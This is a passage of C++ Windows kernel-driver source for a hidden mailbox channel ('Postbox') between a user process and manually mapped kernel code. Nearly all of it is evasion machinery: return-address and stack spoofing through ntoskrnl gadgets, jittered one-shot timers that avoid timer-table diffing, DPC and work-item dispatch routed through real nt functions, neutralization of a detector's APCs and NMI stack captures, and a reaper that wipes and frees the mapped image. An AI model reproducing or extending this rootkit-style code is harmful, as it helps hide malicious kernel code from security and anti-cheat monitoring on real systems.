        PostboxSpoofInvoke<void>((uint64_t) (uintptr_t) &PostboxStackProbeTarget);
    Out->SpoofGadget = g_PostboxShadowJumpGadget;
    Out->SpoofRet = g_PostboxProbeTargetRet;
    const uint64_t NtBase = PostboxStatePtr->NmiSanitize.NtBase;
    const uint64_t NtSize = PostboxStatePtr->NmiSanitize.NtSize;
    const uint64_t ImageBase = PostboxStatePtr->NmiSanitize.ImageBase;
    const uint64_t ImageSize = PostboxStatePtr->NmiSanitize.ImageSize;
    const bool MmHidden = NtSize && ImageSize &&
        Out->Gadget >= NtBase && Out->Gadget < NtBase + NtSize &&
        Out->RealRet >= ImageBase && Out->RealRet < ImageBase + ImageSize;
    const bool SpoofHidden = NtSize &&
        Out->SpoofGadget >= NtBase && Out->SpoofGadget < NtBase + NtSize &&
        Out->SpoofRet >= NtBase && Out->SpoofRet < NtBase + NtSize;
    Out->Hidden = (Ok && MmHidden && SpoofHidden) ? 1 : 0;
    return Ok;
}
#endif

// Cancels the timer and quiesces DPCs. Safe at PASSIVE, including from the work
// routine itself (a work item is not a DPC, so flushing DPCs cannot wait on this thread).
static void PostboxCancel()
{
    __atomic_store_n(&PostboxRunning, 0, __ATOMIC_RELEASE);
#ifndef POSTBOX_EVENT_START
    // Fallback timer/DPC path: cancel the armed one-shot and flush queued DPCs.
    PostboxCancelTimer(&PostboxCtx(PostboxStatePtr)->Timer);
    PostboxFlushQueuedDpcs();
#endif
#ifdef NMI_SANITIZE
    PostboxNmiSanitizeStop(PostboxStatePtr);
#endif
#ifdef POSTBOX_NMI
    // PASSIVE-only: callers are the work routine and PostboxStop.
    PostboxNmiUninstall();
#endif
}

// Re-arms the timer. PASSIVE_LEVEL only (PostboxStart and the work routine).
// Returns false when the timer was not armed (running clear or
// KeSetCoalescableTimer returned a failure); PostboxStart treats that as a
// failed start.
//
// With POSTBOX_ONESHOT_TIMER the period is scheduled as a jittered one-shot due time and
// the period argument is 0, so _KTIMER.Period stays 0: the timer table carries no fixed
// cadence to diff, and each fire's spacing carries rdtsc-derived jitter. OFF restores
// the stock periodic arm.
static bool PostboxArm(uint32_t PeriodMs, uint32_t ToleranceMs)
{
    if (!__atomic_load_n(&PostboxRunning, __ATOMIC_ACQUIRE)) return false;
    _LARGE_INTEGER Due{};
#ifdef POSTBOX_ONESHOT_TIMER
    // Jitter scales with the bucket, so neither 4 ms nor 1 s shows up as a repeating
    // due time in the timer table; only the due time moves, the period argument stays 0.
    const uint32_t Jitter = (uint32_t) __rdtsc() & (PeriodMs <= 8u ? 0x3u : 0xFu);
    Due.QuadPart = -((int64_t) (PeriodMs + Jitter) * 10000);
    const uint32_t Period = 0;   // one-shot
#else
    Due.QuadPart = -((int64_t) PeriodMs * 10000);
    const uint32_t Period = PeriodMs;
#endif
    PostboxWorkContext* Ctx = PostboxCtx(PostboxStatePtr);
    if (!Ctx) return false;
    return PostboxSetCoalescableTimer(
        &Ctx->Timer, Due, Period, ToleranceMs, &Ctx->Dpc) == 0;
}

// Slow the timer after a run of idle polls. Also called on a failed lookup/header read.
static void PostboxIdleTick()
{
    if (PostboxStatePtr)
    {
        const PostboxWorkContext* Ctx = PostboxCtx(PostboxStatePtr);
        if (Ctx && (Ctx->Event || Ctx->EventThread)) return;
    }
#ifdef NMI_SANITIZE
    // The NMI monitor runs on this worker. The 4 ms cadence is only needed while
    // the sanitizer is active, to keep its callback at the head of the detector's
    // per-IOCTL registration. Otherwise stay on the 64 ms active bucket.
    if (PostboxStatePtr && PostboxStatePtr->NmiSanitize.Active)
    {
        PostboxIdleMs = 0;
        if (PostboxPeriodMs != 4)
        {
            PostboxPeriodMs = 4;
            (void) PostboxArm(4, 1);
        }
        return;
    }
#endif
    // One second of polls, then 1 s idle. This works from either the 4 ms
    // start window or the 64 ms active bucket; a stop or request still lands
    // within the 1 s poll and the client's stop timeout is 3 s.
    if (PostboxPeriodMs >= 1000) return;
    PostboxIdleMs += PostboxPeriodMs;
    if (PostboxIdleMs >= 1000)
    {
        PostboxPeriodMs = 1000;
        (void) PostboxArm(1000, 50);
    }
}

// The state page holds the derived key schedule masked. Unmask only for the
// individual crypto call, then immediately re-mask; the stack copy is wiped
// when the poll returns. This keeps the resident and idle stack copies masked.
struct PostboxKeyGuard
{
    pb::PostboxKeys Keys;
    bool Plain = false;

    PostboxKeyGuard()
    {
        __builtin_memcpy(&Keys, &PostboxStatePtr->Keys, sizeof(Keys));
    }
    pb::PostboxKeys& Unmask()
    {
        if (!Plain)
        {
            pb::MaskPostboxKeys(&Keys, PostboxStatePtr->SessionId);
            Plain = true;
        }
        return Keys;
    }
    void Mask()
    {
        if (Plain)
        {
            pb::MaskPostboxKeys(&Keys, PostboxStatePtr->SessionId);
            Plain = false;
        }
    }
    ~PostboxKeyGuard() { pb::WipePostboxKeys(&Keys); }
};

struct PostboxKeyUse
{
    PostboxKeyGuard& Guard;
    pb::PostboxKeys& Keys;
    explicit PostboxKeyUse(PostboxKeyGuard& guard)
        : Guard(guard), Keys(guard.Unmask()) {}
    ~PostboxKeyUse() { Guard.Mask(); }
};

// Authenticated response: seal the whole 0x48 control block, copy the body to
// the caller-owned BufferVa, then publish the control block last. The key is
// unmasked only for header/MAC sealing, then re-masked before the copies.
static bool PostboxRespond(uint64_t MailboxVa, uint64_t BodyVa, void* MailboxProcess,
                           uint32_t Seq, uint64_t Nonce, uint32_t RequestOp,
                           int32_t Status, const uint8_t* Body, uint32_t BodyLen,
                           PostboxKeyGuard& Guard)
{
    PostboxHeader Resp{};
    Resp.Seq = Seq;
    Resp.Ack = Seq;
    Resp.Status = Status;
    Resp.Op = RequestOp;
    Resp.Pid = 0;
    Resp.Size = BodyLen;
    Resp.Address = 0;
    Resp.Nonce = Nonce;
    Resp.SessionId = PostboxStatePtr->SessionId;
    Resp.BufferVa = BodyVa;

    uint8_t Tag[16];
    {
        PostboxKeyUse Use(Guard);
        pb::SealRequestHeader(reinterpret_cast<uint8_t*>(&Resp), Use.Keys,
                              PostboxStatePtr->SessionId, Nonce);
        pb::MacResponseTag(Tag, Use.Keys, PostboxStatePtr->SessionId, Seq, Seq,
                           Status, Nonce, RequestOp,
                           reinterpret_cast<const uint8_t*>(&Resp), Body, BodyLen);
    }
    __builtin_memcpy(Resp.Mac, Tag, sizeof(Tag));

    if (BodyLen != 0 &&
        !PostboxCopySpoof(MailboxProcess, (address) BodyVa, (void*) Body, BodyLen, true))
        return false;

    return PostboxCopySpoof(MailboxProcess, (address) MailboxVa, &Resp, sizeof(Resp), true);
}

// Volatile wipe for stack copies of the header/body. The compiler must not elide it.
static void PostboxWipe(void* Data, size_t Size)
{
    if (!Data) return;
    volatile uint8_t* p = (volatile uint8_t*) Data;
    while (Size--) *p++ = 0;
}

// Wipes and releases the separate NX stage. Safe to call more than once; the pointer
// is cleared so a later stop/watchdog path cannot double-free.
static void PostboxFreeStage()
{
    if (!PostboxStatePtr) return;
    PostboxWorkContext* Ctx = PostboxCtx(PostboxStatePtr);
    uint8_t* Stage = Ctx ? Ctx->Stage : PostboxStatePtr->Stage;
    const bool Independent = Ctx ? (Ctx->StageIndependent != 0)
                                 : PostboxStatePtr->StageIndependent;
    if (!Stage) return;
    PostboxWipe(Stage, StageAllocBytes);
    if (Independent && g_MmFreeIndependentPages)
        PostboxFreeIndependentPages(Stage, StageAllocBytes);
    else
        PostboxFreePool(Stage);
    if (Ctx)
    {
        Ctx->Stage = nullptr;
        Ctx->StageIndependent = 0;
    }
    PostboxStatePtr->Stage = nullptr;
    PostboxStatePtr->StageIndependent = false;
}

// Wipes the live config/keys/pointers but leaves the state page resident: the
// WORK_QUEUE_ITEM and KTIMER/KDPC live there, and the worker may still touch the
// item after the routine returns. The page is private RW/NX and no longer holds
// the keys/config after this call.
#ifdef STACK_SPOOF
// Clear the stack-spoof selector. There is no pool or resident array; each call
// owns a stack frame and the worker is already quiesced. Idempotent.
static void PostboxFreeShadow()
{
    // no resident arrays. Each call owns a stack frame; only the
    // gadget selector and the active flag need clearing.
    g_PostboxShadowActive = 0;
    g_PostboxShadowJumpGadget = 0;
}
#endif

static void PostboxFreeState()
{
    if (!PostboxStatePtr) return;
    // Do NOT free the stack-spoof shadow here. The watchdog and pb_stop callers
    // run INSIDE PostboxPollSpoof; freeing the shadow (or zeroing its return
    // trampoline) under the active spoof frame makes the worker's epilogue jump
    // to RIP=0. The reaper frees it after PostboxInFlight has quiesced, and the
    // failed-start path frees it through PostboxFreeStatePage.
    // Do NOT wipe the timer/DPC objects here. KeCancelTimer + KeFlushQueuedDpcs
    // leaves a narrow window where a timer that fired just before the cancel can
    // queue one more DPC after the flush; wiping the DPC's DeferredRoutine would
    // turn that late DPC into a RIP=0 call. Keep the objects valid through the
    // reaper's 500 ms grace period; the reaper wipes the whole state page only
    // after it has quiesced. The WORK_QUEUE_ITEM is likewise left alone.

    pb::WipePostboxKeys(&PostboxStatePtr->Keys);
    PostboxWipe(&PostboxStatePtr->Cfg, sizeof(PostboxConfig));
    // C-01 cache residue: no worker can use the memory caches after the caller
    // has quiesced; wipe them now rather than leaving kernel bases resident.
    PostboxWipe(&PostboxStatePtr->Caches, sizeof(PostboxMemCaches));
    // Do NOT clear Process here. The caller's PostboxMaybeReleaseProcess (watchdog,
    // pb_stop, invalid-config) is the only path that drops the cached EPROCESS
    // reference; erasing the pointer first would leak the reference every stop.
    PostboxStatePtr->Stage = nullptr;
    PostboxStatePtr->MailboxVa = 0;
    PostboxStatePtr->SessionId = 0;
    PostboxStatePtr->LastNonce = 0;
    PostboxStatePtr->LastSeq = 0;
    PostboxStatePtr->AuthFailures = 0;
    PostboxStatePtr->StageIndependent = false;
}

// Releases the state page itself. Only safe when no timer/DPC/work item can still
// touch it: failed starts (never armed) and a stopped channel with in-flight clear.
static void PostboxFreeStatePage()
{
    if (!PostboxStatePtr) return;
#ifdef STACK_SPOOF
    // The shadow pool is separate from the state page; free it while the page
    // (and its ExFreePool import) is still valid. Idempotent with PostboxFreeState.
    PostboxFreeShadow();
#endif
    // Exchange first so a second teardown cannot free the same page. Wipe the
    // whole 4 KiB, not just sizeof(PostboxState): the tail must not disclose
    // stale kernel memory if the allocator did not zero it.
    PostboxState* State = (PostboxState*) __atomic_exchange_n(
        (void**) &PostboxStatePtr, nullptr, __ATOMIC_ACQ_REL);
    if (!State) return;
    // The free helper now lives inside the page this call is about to wipe. Read
    // it out first; the g_Mm* macros must not be used after the exchange because
    // PostboxStatePtr is already null.
    const address Free = PostboxImportFrom(State, State->Imports.MmFreeIndependentPages);
    PostboxWipe(State, 0x2000);
    if (Free)
        ((FnMmFreeIndependentPages) Free)(State, 0x2000);
}

// Reaper thread body. The assembly entry calls this at PASSIVE with the state
// page as its argument, then tail-jumps to MmFreeIndependentPages. Wait for the
// worker to clear InFlight (which happens after it clears the work item and the
// caller releases the EPROCESS), then give the worker's ret and the loader's
// post-entry ROT1 wipe time to finish.
//
// Returns 1 with Plan filled when the caller may free the image. Returns 0 when
// the worker is still in flight or the page is no longer ours; the stub then
// returns without freeing anything. Leaking is deliberate: freeing the state page
// or image under a stalled worker is a use-after-free/bugcheck.
extern "C" uint64_t PostboxReaperPrepare(PostboxState* State, PostboxReaperPlan* Plan)
{
    if (!State || !Plan) return 0;

    // Save the delay/free helpers before the sensitive residue is wiped.
    const address DelayThread = PostboxImportFrom(
        State, State->Imports.KeDelayExecutionThread);
    if (!DelayThread) return 0;
    PostboxWorkContext* Ctx = PostboxCtx(State);
    for (uint32_t i = 0; i < 1000 &&
                       (__atomic_load_n(&PostboxInFlight, __ATOMIC_ACQUIRE) ||
                        (Ctx && Ctx->EventThread)); ++i)
    {
        PostboxNeutralizeDetectorApcs();
        _LARGE_INTEGER Interval{};
        Interval.QuadPart = -10000;   // 1 ms
        ((FnKeDelayExecutionThread) DelayThread)(0, 0, &Interval);
    }

    if (__atomic_load_n(&PostboxInFlight, __ATOMIC_ACQUIRE) != 0 ||
        (Ctx && Ctx->EventThread))
        return 0;

    const uint64_t Base = State->ReaperBase;
    const uint64_t Size = State->ReaperSize;
    const address Free = PostboxImportFrom(
        State, State->Imports.MmFreeIndependentPages);
    if (!Base || !Size || !Free)
        return 0;

    // Keep the import/cache table and the timer/DPC objects valid through the
    // grace period: a late DPC (queued in the cancel/flush race window) must be
    // able to run with a valid DeferredRoutine and import table. Running is
    // already 0, so it returns without re-arming or queueing.
    // 500 ms grace in 10 ms slices: neutralize a detector APC before each wait
    // so the reaper's mapped stack is never captured at teardown.
    for (uint32_t i = 0; i < 50; ++i)
    {
        PostboxNeutralizeDetectorApcs();
        _LARGE_INTEGER Delay{};
        Delay.QuadPart = -100000;     // 10 ms
        ((FnKeDelayExecutionThread) DelayThread)(0, 0, &Delay);
    }

#ifdef STACK_SPOOF
    // The worker has returned (PostboxInFlight == 0) and the grace period has
    // elapsed, so no spoof frame is active. Free the shadow pool here, never
    // from PostboxFreeState (which runs inside the spoofed worker).
    PostboxFreeShadow();
#endif

    // The work item is idle and the worker has cleared its mapped entry. The
    // context is the second page of the same allocation, so the final page wipe
    // covers it.

    // Exchange first so a concurrent stop cannot free the same page twice. If a
    // new state page replaced this one, leave the old page alone.
    PostboxState* Expected = State;
    if (!__atomic_compare_exchange_n((PostboxState**) &PostboxStatePtr, &Expected,
                                     nullptr, false, __ATOMIC_ACQ_REL,
                                     __ATOMIC_ACQUIRE))
        return 0;

    // No timer/DPC can be queued now (Running == 0 and the grace period has
    // elapsed); wipe both pages, including the context and timer/DPC residue.
    PostboxWipe(State, 0x2000);
    ((FnMmFreeIndependentPages) Free)(State, 0x2000);

    Plan->Base = Base;
    Plan->Size = Size;
    Plan->Free = (uint64_t) Free;
    return 1;
}

// Arms the worker's terminal reaper path. The assembly epilogue consumes the
// flag after it clears PostboxInFlight, then tail-jumps through the existing
// PostboxReaperEntry stub. The stub frees the loader allocation
// (RawBase/AllocSize), not the aligned image base, and returns to ExpWorkerThread.
static bool PostboxStartReaper()
{
    if (__atomic_exchange_n(&PostboxReaperStarted, 1, __ATOMIC_ACQ_REL) != 0)
        return true;
    // The import macros dereference PostboxStatePtr. A second stop after a failed
    // reaper can arrive with the page already freed; refuse instead of faulting.
    if (!PostboxStatePtr)
    {
        __atomic_store_n(&PostboxReaperStarted, 0, __ATOMIC_RELEASE);
        return false;
    }
    PostboxState* State = PostboxStatePtr;
    if (!State->Imports.MmFreeIndependentPages ||
        !State->ReaperBase || !State->ReaperSize)
    {
        __atomic_store_n(&PostboxReaperStarted, 0, __ATOMIC_RELEASE);
        return false;
    }

    // The worker consumes this flag in PostboxWorkEpilogue after it clears
    // PostboxInFlight. It then jumps to PostboxReaperEntry with the state page
    // in RCX, so teardown runs on the nt-owned worker thread. No thread is
    // created, and no post-creation start-address patch is needed.
    __atomic_store_n(&PostboxTeardownPending, 1, __ATOMIC_RELEASE);
    print(INFO("Postbox: reaper armed on worker terminal path"));
    return true;
}

// The client EPROCESS reference and exit synchronization are acquired once at
// start and held for the channel lifetime. Teardown sets a flag and waits for
// the last poll reference, releases the exit synchronization, then dereferences
// the EPROCESS, so a stop cannot race a poll or the client's exit.
static void PostboxReleaseProcess()
{
    if (!PostboxStatePtr) return;
    __atomic_store_n(&PostboxPollTeardown, true, __ATOMIC_RELEASE);
    for (uint32_t i = 0; i < 100000 &&
                       __atomic_load_n(&PostboxPollRefs, __ATOMIC_ACQUIRE); ++i)
        __builtin_ia32_pause();
    if (__atomic_load_n(&PostboxPollRefs, __ATOMIC_ACQUIRE) != 0)
        return;

    PostboxWorkContext* Ctx = PostboxCtx(PostboxStatePtr);
    void* Process = Ctx ? Ctx->Process : PostboxStatePtr->Process;
    if (Ctx) Ctx->Process = nullptr;
    PostboxStatePtr->Process = nullptr;
    if (Process)
    {
        PostboxReleaseProcessExit(Process);
        if (g_ObDereferenceObject)
            PostboxDereferenceObject(Process);
    }
}

static void PostboxMaybeReleaseProcess()
{
    if (!__atomic_load_n(&PostboxRunning, __ATOMIC_ACQUIRE))
        PostboxReleaseProcess();
}

// A dead client must not leave an armed timer forever. Failures are counted only after the
// idle backoff has reached 1 s, so 60 failures is about 60 s. A successful header read
// or request resets the count; the watchdog then cancels the timer and wipes the config.
static void PostboxDeadReset()
{
    PostboxDeadTicks = 0;
}

static void PostboxDeadTick()
{
    if (PostboxPeriodMs != 1000) return;
    if (++PostboxDeadTicks < 60) return;
    PostboxCancel();
    PostboxFreeStage();
    PostboxFreeState();
    // Finish every state-page write before the reaper can free the page.
    PostboxStatePtr->SessionId = 0;
    PostboxStatePtr->LastNonce = 0;
    PostboxStartReaper();
}

#if defined(STACK_SPOOF) && defined(NMI_SANITIZE)
// DPC install. The KDPC points at the real nt PfSnPowerBoostDpc function, which
// queues the work item at DeferredContext+0x88. The work item's WorkerRoutine is
// a .pdata-covered nt jmp-[rcx] thunk and [Context] is the mapped work entry.
[[maybe_unused]] static bool PostboxInstallDpcSpoof(PostboxState* S)
{
    if (!S || !PostboxCtx(S)) return false;
    uint64_t Nt = S->NmiSanitize.NtBase;
    uint64_t NtSize = S->NmiSanitize.NtSize;
    if (!Nt) Nt = (uint64_t) (uintptr_t) GetNtoskrnl();
    if (Nt && !NtSize)
    {
        const auto* Dos = (const _IMAGE_DOS_HEADER*) (uintptr_t) Nt;
        if (Dos->e_magic == 0x5A4D)
        {
            const auto* Nth = (const _IMAGE_NT_HEADERS64*)
                __builtin_assume_aligned((const uint8_t*) (uintptr_t) Nt + Dos->e_lfanew, 8);
            if (Nth->Signature == 0x00004550)
                NtSize = Nth->OptionalHeader.SizeOfImage;
        }
        S->NmiSanitize.NtBase = Nt;
        S->NmiSanitize.NtSize = NtSize;
    }
    if (!Nt || !NtSize)
    {
        PostboxStartFailure = 42;
        return false;
    }
    // The DPC routine is PfSnPowerBoostDpc: a real nt function entry that
    // queues the WORK_QUEUE_ITEM at DeferredContext+0x88. No mapped routine is
    // reachable from KDPC. The work item's WorkerRoutine is a .pdata-covered nt
    // jmp [rcx] thunk; [Context] holds the mapped work entry.
    const address ExQueue = PostboxImportFrom(S, S->Imports.ExQueueWorkItem);
    uint32_t QueueDisp = 0;
    const uint64_t QueueFn = PostboxNmiFindDpcQueueFunction(Nt, NtSize, ExQueue, &QueueDisp);
    if (!QueueFn)
    {
        PostboxStartFailure = 43;
        print(ERROR("Postbox: no backed DPC work-queue function"));
        return false;
    }
    if (QueueDisp != offsetof(PostboxWorkContext, QueueWork))
    {
        PostboxStartFailure = 45;
        print(ERROR("Postbox: DPC work item offset changed (0x%x)"), QueueDisp);
        return false;
    }
    S->WorkJump = PostboxNmiFindWorkJumpGadget(Nt, NtSize);
    if (!S->WorkJump)
    {
        PostboxStartFailure = 44;
        print(ERROR("Postbox: no .pdata-covered work jump thunk"));
        return false;
    }
    PostboxCtx(S)->Entry = (uint64_t) (uintptr_t) &PostboxWorkEntry;
    PostboxCtx(S)->QueueWork.List.Flink = nullptr;
    PostboxCtx(S)->QueueWork.List.Blink = nullptr;
    PostboxCtx(S)->QueueWork.WorkerRoutine = (void*) (uintptr_t) S->WorkJump;
    PostboxCtx(S)->QueueWork.Parameter = PostboxCtx(S);
    PostboxCtx(S)->Dpc.DeferredRoutine = (void*) (uintptr_t) QueueFn;
    PostboxCtx(S)->Dpc.DeferredContext = (void*) PostboxCtx(S);
    print(INFO("Postbox: DPC work queue %p (+0x%x), work entry thunk %p"),
          (void*) (uintptr_t) QueueFn, QueueDisp, (void*) (uintptr_t) S->WorkJump);
    return true;
}
#endif

// Runs at PASSIVE_LEVEL in an existing system worker thread. The assembly
// PostboxWorkEntry wrapper calls this and clears PostboxInFlight only after it
// returns; do not clear InFlight here.
// Worker poll call through the generic trampoline. PostboxPoll's mapped return
// address is replaced by the nt gadget while it runs.
static void PostboxPollSpoof()
{
#ifdef STACK_SPOOF
    if (g_PostboxPopRspRetSkip)
    {
        PostboxSpoofInvoke<void>((uint64_t) (uintptr_t) &PostboxPoll);
        return;
    }
#endif
    PostboxPoll();
}

extern "C" void PostboxEventThreadEntry();
extern "C" void PostboxEventStackEntry();

extern "C" void PostboxEventLoop()
{
    PostboxState* S = PostboxStatePtr;
    PostboxWorkContext* Ctx = PostboxCtx(S);
    if (!S || !Ctx) return;
    Ctx->EventThread = 1;
#ifdef STACK_SPOOF
    // per-call stack frames: no resident shadow state page is required.
    const bool SpoofReady = g_PostboxShadowJumpGadget && g_PostboxPopRspRetSkip;
    g_PostboxApiShadow = SpoofReady ? 1 : 0;
#endif
    uint64_t LastSeq = S->LastSeq;
    uint32_t Idle = 0;
    for (;;)
    {
        if (!__atomic_load_n(&PostboxRunning, __ATOMIC_ACQUIRE)) break;
        _LARGE_INTEGER Timeout{};
        Timeout.QuadPart = -10000000;
        bool TimedOut = false;
        if (Ctx->Event)
        {
            const int32_t Wait = PostboxWaitEvent(Ctx->Event, &Timeout);
            if (!__atomic_load_n(&PostboxRunning, __ATOMIC_ACQUIRE)) break;
            TimedOut = (Wait == 0x00000102);
        }
        else
        {
            // Event-at-start: no client event yet. Sleep 1 s and poll the
            // mailbox; the first ping adopts the client event below.
            PostboxDelayExecutionThread(0, 0, &Timeout);
            if (!__atomic_load_n(&PostboxRunning, __ATOMIC_ACQUIRE)) break;
            TimedOut = true;
        }
        if (TimedOut)
        {
            if (++Idle >= 60)
            {
                PostboxCancel();
                PostboxFreeStage();
                PostboxFreeState();
                S->SessionId = 0;
                S->LastNonce = 0;
                PostboxMaybeReleaseProcess();
                PostboxStartReaper();
                break;
            }
        }
        else
        {
            Idle = 0;
        }
        PostboxPoll();
        if (S->LastSeq != LastSeq)
        {
            LastSeq = S->LastSeq;
            Idle = 0;
        }
    }
    Ctx->EventThread = 0;
    if (Ctx->EventIsClient && Ctx->Event)
        PostboxDereferenceObject(Ctx->Event);
    Ctx->Event = nullptr;
    Ctx->EventIsClient = 0;
#ifdef STACK_SPOOF
    g_PostboxApiShadow = 0;
#endif
}

#ifndef POSTBOX_EVENT_START
static bool PostboxStartEventThread(void* UserHandle)
{
    PostboxState* S = PostboxStatePtr;
    PostboxWorkContext* Ctx = PostboxCtx(S);
    if (!S || !Ctx || !UserHandle) return false;
    if (Ctx->Event) return true;

    void* Event = nullptr;
    if (PostboxReferenceEvent(UserHandle, &Event) < 0 || !Event) return false;

    // The event thread uses its own start context at +0x38. Do not reuse
    // Ctx->Entry (the work item's [Context]): a timer already armed for the
    // first request can still queue a work item after this call, and that item
    // must enter PostboxWorkEntry, not the event loop.
    Ctx->Event = Event;
    Ctx->EventIsClient = 1;
    Ctx->EventEntry = (uint64_t) (uintptr_t) &PostboxEventThreadEntry;
    void* Thread = nullptr;
    if (PostboxCreateEventThread(&Thread, (void*) (uintptr_t) S->WorkJump,
                                 &Ctx->EventEntry) < 0 ||
        !Thread)
    {
        Ctx->EventEntry = 0;
        Ctx->Event = nullptr;
        Ctx->EventIsClient = 0;
        PostboxDereferenceObject(Event);
        return false;
    }
    PostboxCloseEventThread(Thread);
    // The event trigger owns the wakeups now. Cancel the one-shot armed by the
    // first request so no extra work item runs the poll in parallel.
    PostboxCancelTimer(&Ctx->Timer);
    return true;
}
#else
// Event-at-start: the thread is already running. The first ping only adopts the
// client event handle; it does not create a second thread.
static bool PostboxAdoptEvent(void* UserHandle)
{
    PostboxState* S = PostboxStatePtr;
    PostboxWorkContext* Ctx = PostboxCtx(S);
    if (!S || !Ctx || !UserHandle) return false;
    if (Ctx->Event) return true;

    void* Event = nullptr;
    if (PostboxReferenceEvent(UserHandle, &Event) < 0 || !Event) return false;
    Ctx->Event = Event;
    Ctx->EventIsClient = 1;
    return true;
}

static bool PostboxStartEventAtStart()
{
    PostboxState* S = PostboxStatePtr;
    PostboxWorkContext* Ctx = PostboxCtx(S);
    if (!S || !Ctx) return false;

    // This path never queues a work item, so do not leave the mapped
    // PostboxWorkEntry target resident in the context (event mode keeps Entry 0).
    Ctx->Entry = 0;

    uint64_t Nt = S->NmiSanitize.NtBase;
    uint64_t NtSize = S->NmiSanitize.NtSize;
    if (!Nt) Nt = (uint64_t) (uintptr_t) GetNtoskrnl();
    if (Nt && !NtSize)
    {
        const auto* Dos = (const _IMAGE_DOS_HEADER*) (uintptr_t) Nt;
        if (Dos->e_magic == 0x5A4D)
        {
            const auto* Nth = (const _IMAGE_NT_HEADERS64*)
                __builtin_assume_aligned((const uint8_t*) (uintptr_t) Nt + Dos->e_lfanew, 8);
            if (Nth->Signature == 0x00004550)
                NtSize = Nth->OptionalHeader.SizeOfImage;
        }
        S->NmiSanitize.NtBase = Nt;
        S->NmiSanitize.NtSize = NtSize;
    }
    const uint64_t Ums = PostboxNmiFindUmsRestore(Nt, NtSize);
    if (!Ums)
    {
        PostboxStartFailure = 46;
        print(ERROR("Postbox: no exact-entry UMS restore thunk"));
        return false;
    }
    // PostboxStart moves every resolved import into the state RVA table and
    // zeroes the raw .data slots before this point. Read the state import, not
    // g_PsTerminateSystemThread_Raw (which is intentionally zero now).
    const address Term = g_PsTerminateSystemThread;
#ifdef POSTBOX_EVENT_START
    print(INFO("Postbox: event start PsTerminate %p (state rva 0x%x)"),
          (void*) (uintptr_t) Term,
          PostboxStatePtr->Imports.PsTerminateSystemThread);
#endif
    if (!Term)
    {
        PostboxStartFailure = 47;
        print(ERROR("Postbox: PsTerminateSystemThread unavailable"));
        return false;
    }
    const uint64_t RetThunk = PostboxNmiFindRetThunk(Nt, NtSize);
    if (!RetThunk)
    {
        PostboxStartFailure = 49;
        print(ERROR("Postbox: no exact-entry nt ret thunk"));
        return false;
    }
    const uint64_t SkipThunk = PostboxNmiFindSkipThunk(Nt, NtSize);
    if (!SkipThunk)
    {
        PostboxStartFailure = 50;
        print(ERROR("Postbox: no exact-entry nt skip thunk"));
        return false;
    }
    g_PostboxTerminalSkip = SkipThunk;

    // Count=32 copies four qwords backwards into the thread InitialStack.
    // In ascending stack order these are:
    //   [rsp]    = EventThread (unused)
    //   [rsp+8]  = EventEntry  = exact-entry nt ret thunk
    //   [rsp+16] = Copy[0]     = PsTerminateSystemThread
    //   [rsp+24] = Copy[1]
    // PostboxEventStackEntry shifts up 8 so the event loop runs at the normal
    // start ABI. PostboxEventReaperEntry is entered at RSP 8 mod 16 and enters
    // MmFreeIndependentPages with RSP = slot-0x20, so MmFree's 0x20-byte shadow
    // spill only touches EventThread/Copy[1]. The skip thunk adds 0x28, pops the
    // exact-entry ret thunk, which pops PsTerminateSystemThread; every entry is
    // 8 mod 16 and no terminal slot sits in MmFree's shadow space.
    Ctx->EventThread = 0;
    Ctx->EventEntry = RetThunk;
    Ctx->StartSwitch.Copy[0] = (uint64_t) (uintptr_t) Term;
    Ctx->StartSwitch.Copy[1] = 0;
    Ctx->StartSwitch.Source = (void*) &Ctx->StartSwitch.Copy[2];
    Ctx->StartSwitch.Count = 32;
    Ctx->StartSwitch.Target = (uint64_t) (uintptr_t) &PostboxEventStackEntry;
    Ctx->Event = nullptr;
    Ctx->EventIsClient = 0;

    void* Thread = nullptr;
    if (PostboxCreateEventThread(&Thread, (void*) (uintptr_t) Ums,
                                 &Ctx->StartSwitch) < 0 ||
        !Thread)
    {
        PostboxStartFailure = 48;
        return false;
    }
    PostboxCloseEventThread(Thread);
    return true;
}
#endif

extern "C" void PostboxWorkRoutine(void*)
{
    PostboxState* State = PostboxStatePtr;
    PostboxWorkContext* Ctx = State ? PostboxCtx(State) : nullptr;
    // The nt work thunk has already consumed [State+0x1000]. Clear the mapped
    // entry for the worker run and teardown; it is repopulated only immediately
    // before the next timer arm. The armed interval remains the unavoidable
    // residency window because the nt DPC cannot write the entry itself.
    if (Ctx) Ctx->Entry = 0;
#ifdef STACK_SPOOF
    // The worker runs at PASSIVE_LEVEL and owns the shadow stack. Enable the
    // per-API wrappers only here; the DPC path keeps its direct calls and can
    // interrupt this worker without reusing the shadow area.
    // per-call stack frames: no resident shadow state page is required.
    const bool SpoofReady = g_PostboxShadowJumpGadget && g_PostboxPopRspRetSkip;
    g_PostboxApiShadow = SpoofReady ? 1 : 0;
#endif
    if (__atomic_load_n(&PostboxRunning, __ATOMIC_ACQUIRE))
    {
#ifdef NMI_SANITIZE
        // Detector refresh/activation and monitor re-registration are PASSIVE
        // work, never an NMI. Both now run on this existing worker; no
        // dedicated monitor/refresh thread exists.
        if (State && State->NmiSanitize.Ready)
        {
            uint64_t PerformanceCounter = 0;
            const uint64_t Now = g_KeQueryInterruptTime
                ? ((FnKeQueryInterruptTime) g_KeQueryInterruptTime)(&PerformanceCounter) : 0;
            if (State->NmiSanitize.RefreshDeadline == 0 ||
                Now >= State->NmiSanitize.RefreshDeadline)
            {
                State->NmiSanitize.RefreshDeadline = Now + 10000000ull; // 1 s
#ifdef NMI_PROBE
                State->NmiSanitize.RefreshCount++;
#endif
                if (!State->NmiSanitize.Active)
                    PostboxNmiTryActivate(State);
                else
                    PostboxNmiRefreshDetector(State);
            }
#ifdef NMI_FRAME_FIRST
            if (State->NmiSanitize.Active)
                PostboxNmiMonitorStep(State);
#endif
        }
#endif
#ifdef E3_DPC_PROBE
        // Run the test-only CPU-1 probe once, before the first mailbox poll.
        if (__atomic_exchange_n(&E3Started, 1, __ATOMIC_ACQ_REL) == 0)
            E3RunProbe();
#endif
        PostboxPollSpoof();
    }

    // The nt DPC only queues the work item; the worker re-arms the one-shot
    // timer after each poll. This runs at PASSIVE and before the spoof gate is
    // cleared, so the timer set uses the shadow stack. A stop sets Running=0
    // during the poll and skips the re-arm.
    if (Ctx && !Ctx->Event &&
        __atomic_load_n(&PostboxRunning, __ATOMIC_ACQUIRE))
    {
        Ctx->Entry = (uint64_t) (uintptr_t) &PostboxWorkEntry;
        (void) PostboxArm(PostboxPeriodMs,
                          PostboxPeriodMs <= 8u ? 1u :
